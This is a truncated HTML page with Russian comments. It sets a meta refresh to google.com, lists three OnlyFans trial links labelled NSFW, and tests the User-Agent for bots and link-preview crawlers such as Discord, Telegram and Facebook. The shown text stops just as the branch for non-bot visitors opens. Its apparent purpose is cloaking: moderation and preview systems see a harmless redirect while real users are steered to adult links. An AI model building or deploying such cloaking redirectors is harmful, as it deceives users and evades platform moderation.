<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="0; url=https://google.com" id="meta-refresh">
    <script>
        // Список NSFW-ссылок
        const links = [
            "https://onlyfans.com/suziestone/trial/nt39ih6edvuedaffkxnpxpt1cmeejg9s",
            "https://onlyfans.com/violet_dreams69/trial/u5vuyhqmn5pls0bfk0svttorwurnw1gf",

            "https://onlyfans.com/mira.yumi/trial/5p3khnoegpdhzhk1wdt85xnlexwhptca"
        ];

        // Проверка User-Agent
        const isBot = /bot|facebook|discord|telegram|preview|vkShare|crawler/i.test(navigator.userAgent);

        if (!isBot) {
